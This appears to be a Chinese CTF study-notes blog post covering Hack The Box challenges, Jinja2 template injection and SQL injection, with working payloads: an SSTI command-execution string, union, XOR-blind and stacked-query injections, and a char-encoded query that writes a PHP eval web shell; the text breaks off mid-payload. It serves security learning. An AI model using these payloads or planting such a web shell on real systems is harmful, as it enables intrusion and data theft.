<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CTF做题笔记 | M4XLMUM</title><meta name="keywords" content="ctf,misc,web,crypto,reverse"><meta name="author" content="M4XLMUM"><meta name="copyright" content="M4XLMUM"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[TOC] 前言​    本片文章主要写的内容——CTF领域内我所学到的所有方向的笔记。     ​    之前的博客环境与内容坏了，内容还在，不过md的内容已经永久遗失了，之后会将所有的关于CTF内容记录到此文件内，笔记的内容尽量不超过20万字，防止读者打开的速度过慢。 ​    之后会将从前写的文章放到百度网盘内备份，并且随着我放到我的VPS内，如果我没vps了就访问如下的GitHub的地址，">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF做题笔记">
<meta property="og:url" content="https://a16n.github.io/2021/05/28/CTF/index.html">
<meta property="og:site_name" content="M4XLMUM">
<meta property="og:description" content="[TOC] 前言​    本片文章主要写的内容——CTF领域内我所学到的所有方向的笔记。     ​    之前的博客环境与内容坏了，内容还在，不过md的内容已经永久遗失了，之后会将所有的关于CTF内容记录到此文件内，笔记的内容尽量不超过20万字，防止读者打开的速度过慢。 ​    之后会将从前写的文章放到百度网盘内备份，并且随着我放到我的VPS内，如果我没vps了就访问如下的GitHub的地址，">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://a16n.github.io/img/topimg/image-20210528154723696.png">
<meta property="article:published_time" content="2021-05-28T05:48:17.000Z">
<meta property="article:modified_time" content="2021-09-26T09:41:51.116Z">
<meta property="article:author" content="M4XLMUM">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="misc">
<meta property="article:tag" content="web">
<meta property="article:tag" content="crypto">
<meta property="article:tag" content="reverse">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://a16n.github.io/img/topimg/image-20210528154723696.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://a16n.github.io/2021/05/28/CTF/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu_site_verification" content="Erg2Bytt6M"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-9257596953357662',
  enable_page_level_ads: 'true'
});</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":200,"languages":{"author":"作者: M4XLMUM","link":"链接: ","source":"来源: M4XLMUM","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-09-26 17:41:51'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    })(window)</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/logo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 爱好</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/musics/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></li><li><a class="site-page child" href="/galleries/"><i class="fa-fw fas fa-camera"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/topimg/image-20210528154723696.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">M4XLMUM</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 爱好</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/musics/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></li><li><a class="site-page child" href="/galleries/"><i class="fa-fw fas fa-camera"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTF做题笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-28T05:48:17.000Z" title="发表于 2021-05-28 13:48:17">2021-05-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-09-26T09:41:51.116Z" title="更新于 2021-09-26 17:41:51">2021-09-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">31.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>153分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTF做题笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>[TOC]</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    本片文章主要写的内容——CTF领域内我所学到的所有方向的笔记。    </p>
<p>​    之前的博客环境与内容坏了，内容还在，不过md的内容已经永久遗失了，之后会将所有的关于CTF内容记录到此文件内，笔记的内容尽量不超过20万字，防止读者打开的速度过慢。</p>
<p>​    之后会将从前写的文章放到百度网盘内备份，并且随着我放到我的VPS内，如果我没vps了就访问如下的GitHub的地址，不过这里面的url确实挺长的，如果你对我从前文章的内容感兴趣的话，请访问<a target="_blank" rel="noopener" href="https://github.com/m4xlmum/a16n.github.io/">我从前的博客</a>，但是其实以前的内容也没啥，直接dump下来看好了。往后一定认真写博客，主要的是一定要备份，以前写的好多文章都没了，还是挺心疼的(还好备份还在)</p>
<ol>
<li>WEB——网络安全，主要考察一些web安全漏洞，包括SQL注入、xss、xxe、ssti、代码审计、反序列化安全、各种cms的漏洞等。</li>
<li>MISC——杂项，考察内容覆盖广泛，主要包含隐写术、古典密码学、压缩包、图片、编码、取证等方面。</li>
<li>REVERSE——逆向工程，主要考察软件破解与软件算法逆向。有时会涉及软件脱壳与动态调试。</li>
<li>MOBILE——移动安全，类似于逆向工程，主要考察软件破解、算法逆向、脱壳与动态调试。</li>
<li>CRYPTO——密码学，以”XX学”命名的肯定很难啦，主要方向有古典密码、现代密码，现代密码又可以分为流密码、分组密码、公钥密码等。</li>
</ol>
<h1 id="Hack-The-Box"><a href="#Hack-The-Box" class="headerlink" title="Hack The Box"></a>Hack The Box</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>夹杂在众多CTF题目中的多股清流，下面分为WEB、MISC这些类的都是题目比较杂、比较多的平台上的总结。再分几个比较小的平台的写，这是第一个，界面超炫酷的HTB。</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="快速传参-Emdee-five-for-life"><a href="#快速传参-Emdee-five-for-life" class="headerlink" title="快速传参-Emdee five for life"></a>快速传参-Emdee five for life</h3><p><img src="/2021/05/28/CTF/image-20210602225736815.png" alt="image-20210602225736815"></p>
<p><img src="/2021/05/28/CTF/image-20210602225914557.png" alt="image-20210602225914557"></p>
<p>第一关太简单了（一看就知道这不就是签到题嘛，靠的就是写脚本，快速传参吧），本来都懒得写了，但是本着做做也无所谓的念头还是写了个简单的脚本来搞</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5

url <span class="token operator">=</span> <span class="token string">'http://46.101.33.243:31878/'</span>

session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text
res <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>resp<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>
dmd5 <span class="token operator">=</span> res<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'h3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text  <span class="token comment"># 使用bs4解析网页数据</span>
ymd5 <span class="token operator">=</span> md5<span class="token punctuation">(</span>dmd5<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

resp2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'hash'</span><span class="token punctuation">:</span> ymd5<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
<span class="token keyword">print</span><span class="token punctuation">(</span>BeautifulSoup<span class="token punctuation">(</span>resp2<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span class="token comment"># HTB&#123;N1c3_ScrIpt1nG_B0i!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>稍微优化了一下下呀。</p>
<p><img src="/2021/05/28/CTF/image-20210602232640054.png" alt="炫酷的界面"></p>
<h3 id="SSTI、Jinja2-Templated"><a href="#SSTI、Jinja2-Templated" class="headerlink" title="SSTI、Jinja2-Templated"></a>SSTI、Jinja2-Templated</h3><pre class="line-numbers language-none"><code class="language-none">Site still under construction
Proudly powered by Flask&#x2F;Jinja2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>开局给的提示，用的python的flask写的，这很明显的ssti漏洞，而且还是Jinja2的。</p>
<p>ssti但是没有给注入点提示啊，给个<code>id=1</code>也好啊，这种情况我也么啥好用的工具，只好看看wp，原来直接<code>/&#123;&#123;7+7&#125;&#125;</code>就行了，然后就是Jinja2的专用payload了，一般这些ssti的payload都是相似的，所以总结一下。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_19381989/article/details/103175728">Jinja2模板注入的总结文</a></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#123;&#123;config&#125;&#125;
&#123;&#123; &quot;&quot;.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read() &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>class是本类、mro是父类、subclasses是子类集合，这里的子类是<code>186</code>里面有<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>似乎是。</p>
<p><img src="/2021/05/28/CTF/image-20210602234813169.png" alt="image-20210602234813169"></p>
<pre class="line-numbers language-none"><code class="language-none">HTB&#123;t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入常用函数与知识点"><a href="#SQL注入常用函数与知识点" class="headerlink" title="SQL注入常用函数与知识点"></a>SQL注入常用函数与知识点</h3><h4 id="字符串提取-substr、mid"><a href="#字符串提取-substr、mid" class="headerlink" title="字符串提取(substr、mid)"></a>字符串提取(substr、mid)</h4><div class="table-container">
<table>
<thead>
<tr>
<th>函数名称</th>
<th>函数使用</th>
<th>函数功能</th>
<th>详细链接</th>
</tr>
</thead>
<tbody>
<tr>
<td>substr</td>
<td>substr()</td>
<td></td>
<td></td>
</tr>
<tr>
<td>mid</td>
<td>mid(“text”,1,1)</td>
<td>返回t，第一个1表示起始位置，第二个1表示截取长度</td>
<td><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/sql/sql_func_mid.asp">MID使用</a></td>
</tr>
</tbody>
</table>
</div>
<p><img src="/2021/05/28/CTF/image-20210601161051184.png" alt="mid方法"></p>
<h3 id="SQL注入的类型"><a href="#SQL注入的类型" class="headerlink" title="SQL注入的类型"></a>SQL注入的类型</h3><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>二次注入就是在一个地方进行数据库插入，另一个地方进行数据库数据的取出，插入时可能对注入进行了过滤啥的，但是取出的时候没进行过滤，就能执行我们想要插入的恶意代码了。</p>
<p>但是这个注入的断定是比较难的，因为要对两个不同的位置进行联合测试，应该是所有注入类型中最难找到的了，实战中我们往往会错过这类注入点。</p>
<p>这类注入点没有特定的payload，往往与下面的各种注入类型交叉使用。</p>
<h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>一般分为<code>单引号</code>、<code>双引号</code>的字符型联合注入，和数字型联合注入。</p>
<p>联合查询注入现在实战应用中已经很少了，这种是没有什么难度的。</p>
<h4 id="盲注-时间盲注、布尔盲注"><a href="#盲注-时间盲注、布尔盲注" class="headerlink" title="盲注(时间盲注、布尔盲注)"></a>盲注(时间盲注、布尔盲注)</h4><h4 id="异或盲注"><a href="#异或盲注" class="headerlink" title="异或盲注"></a>异或盲注</h4><h4 id="形成原理与payload"><a href="#形成原理与payload" class="headerlink" title="形成原理与payload"></a>形成原理与payload</h4><p><strong>盲注的形成原理都是相同的，不存在返回值，或者只存在对于错的返回值这种，但是我们插入进去的SQL语句又实实在在是起到了作用了的就能使用盲注来进行获取数据信息。</strong></p>
<p>这里主要再说一下异或盲注的形成原理与payload，异或注入的表现为<code>?id=1^1^1</code>返回的是<code>?id=1</code>的内容、<code>?id=1^0^1</code>返回的是<code>?id=0</code>的内容。这样就能借助SQL里面的一些方法来获取数据库里面的数据信息啦。</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1^(if(ascii(mid(database(),1,1))&gt;32,1,0))^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>不断变换<code>database()</code>处为我们想注入的SQL语句、后面第一个1是第几个字母、后面的32为字母的值。</p>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h4 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h4><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><h5 id="简单介绍与一般payload"><a href="#简单介绍与一般payload" class="headerlink" title="简单介绍与一般payload"></a>简单介绍与一般payload</h5><p>堆叠注入是利用<code>;</code>隔开几个查询语句，使得几个查询语句都可以进行，从而进行SQL注入。危险的SQL语句一般为<code>mysql_multi_query()</code>，因为<code>mysql_multi_query()</code> 支持多条sql语句同时执行，每个SQL语句使用<code>;</code>分隔即可分别执行。</p>
<p>没有固定的payload一般payload如下：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment">--+</span>
<span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment">--+</span>
<span class="token number">1</span>"<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>但是实战时只是用上面的语句的可能性几乎为零，而且这个似乎只是php的这个<code>mysql_multi_query()</code>语句的特性，而实战时几乎好多都是jsp、asp等老网页，也是比较安全的(一定是我现在太菜了，还没开始学jsp、asp的原因才会觉得这两种语言写的网页安全)。</p>
<h4 id="绕过限制Bypass"><a href="#绕过限制Bypass" class="headerlink" title="绕过限制Bypass"></a>绕过限制Bypass</h4><p>基于上面的几种注入又各自有不同的绕过限制的方法，上面的几种注入只是我们使用SQL注入的大纲，但是更重要的是各种限制的绕过，比如说禁用了单双引号，也许可以想想使用<code>\</code>来转义单双引号来绕过限制等等。</p>
<hr>
<h3 id="二次注入-1"><a href="#二次注入-1" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h4><p><strong>TAG:二次注入、联合查询注入</strong></p>
<p>给出的有两个功能，一个注册登录、一个修改密码的功能(查询的是用户名)</p>
<p>先使用下面的payload进行测试</p>
<pre class="line-numbers language-none"><code class="language-none">username &#x3D; 1&#39; union select database() #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>password可以自己随便设置，直接登录即可发现数据已经注出来了。</p>
<p><img src="/2021/05/28/CTF/image-20210604235055344.png" alt="image-20210604235055344"></p>
<p>这题不是盲注就不用使用脚本了，直接贴出所有的payload，直接注册登录就能查询到信息了。</p>
<p><strong>爆数据表</strong></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210604235538363.png" alt="image-20210604235538363"></p>
<p><strong>爆列名</strong></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39; #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210604235738874.png" alt="image-20210604235738874"></p>
<p><strong>获取数据</strong></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; union select * from flag #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210604235837283.png" alt="image-20210604235837283"></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;fd2e5523-e1d1-4f17-aa7a-a85142ff023f&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="堆叠注入-1"><a href="#堆叠注入-1" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="sql注入getshell、-SUCTF-2018-MultiSQL"><a href="#sql注入getshell、-SUCTF-2018-MultiSQL" class="headerlink" title="sql注入getshell、[SUCTF 2018]MultiSQL"></a>sql注入getshell、[SUCTF 2018]MultiSQL</h4><p>这个给出的是一个小网站，有登录、注册、查看个人信息、上传个人头像等功能。</p>
<p><img src="/2021/05/28/CTF/image-20210601150932381.png" alt="image-20210601150932381"></p>
<p>根据上面的这个payload确认这里是存在SQL注入漏洞的，而且还是异或注入。可以用下面的payload自行进行测试</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn&#x2F;user&#x2F;user.php?id&#x3D;1^0^1
http:&#x2F;&#x2F;3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn&#x2F;user&#x2F;user.php?id&#x3D;1^1^1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后接下去继续测试注入，但是substr似乎是被过滤掉了，这里考虑使用mid来替代substr</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn&#x2F;user&#x2F;user.php?id&#x3D;1^(if(ascii(mid(database(),1,1))&gt;32,1,0))^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里不仅仅有异或注入，还有堆叠注入，直使用下面的payload也是没有报错的</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后就是堆叠注入用<code>select into outfile</code>写入shell，这是一个php做的网站，所以可以用下面的payload</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"select '&lt;?php eval($_POST[4]);?>' into outfile '/var/www/html/favicon/shell.php';"</span>
res <span class="token operator">=</span> <span class="token string">"char("</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">','</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">')'</span><span class="token punctuation">)</span>
<span class="token comment"># char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,52,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>利用sql的预处理来写shell</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token variable">@payload</span><span class="token operator">=</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token 